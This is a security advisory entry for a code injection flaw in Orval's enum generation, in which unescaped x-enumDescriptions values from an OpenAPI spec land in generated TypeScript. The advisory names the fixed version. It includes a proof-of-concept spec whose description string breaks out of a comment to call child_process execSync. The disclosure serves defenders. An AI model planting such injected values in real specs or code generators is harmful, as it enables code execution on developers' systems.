  "summary": "Orval has a code injection via unsanitized x-enum-descriptions in enum generation",
  "details": "### Impact\nArbitrary code execution in environments consuming generated clients\n\nThis issue is similar in nature to the recently-patched MCP vulnerability (CVE-2026-22785), but affects a different code path in @orval/core that was not addressed by that fix.\n\nThe vulnerability allows untrusted OpenAPI specifications to inject arbitrary TypeScript/JavaScript code into generated clients via the x-enumDescriptions field, which is embedded without proper escaping in getEnumImplementation(). I have confirmed that the injection occurs during const enum generation and results in executable code within the generated schema files.\n\n### Patches\nUpgrade to Orval 8.0.2\n\n### References\nAn example OpenAPI showing the issue:\n\n```yaml\nopenapi: 3.0.4\ninfo:\n  title: Enum PoC\n  version: \"1.0.0\"\n\npaths:\n  /ping:\n    get:\n      operationId: ping\n      responses:\n        \"200\":\n          description: ok\n          content:\n            application/json:\n              schema:\n                $ref: \"#/components/schemas/EvilEnum\"\n\ncomponents:\n  schemas:\n    EvilEnum:\n      type: string\n      enum:\n        - PWNED\n      x-enumDescriptions:\n        - \"pwned */ require('child_process').execSync('id'); /*\"\n```",
